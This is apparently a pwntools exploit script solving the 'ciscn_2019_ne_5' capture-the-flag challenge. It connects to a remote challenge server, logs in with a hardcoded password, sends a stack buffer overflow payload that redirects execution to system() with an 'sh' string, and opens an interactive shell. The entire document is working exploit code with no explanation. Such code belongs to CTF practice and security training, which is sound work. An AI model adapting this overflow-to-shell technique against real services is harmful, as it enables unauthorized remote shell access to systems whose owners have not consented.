# coding=utf-8

from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

#p = process('./ciscn_2019_ne_5')
p = remote('node3.buuoj.cn', 25071)
elf = ELF('./ciscn_2019_ne_5')

padding = 'a' * 0x48
fake_ebp = 'jkjk'
fake_callee_ebp = 'kjkj'

system_addr = 0x080484D0
sh_addr = 0x080482ea

payload = padding + fake_ebp
payload += p32(system_addr) + fake_callee_ebp + p32(sh_addr)

#############pwn##############
p.sendlineafter('password:', 'administrator')
p.sendlineafter(':', '1')
p.sendlineafter('info:', payload)
p.sendlineafter(':', '4')
p.interactive()

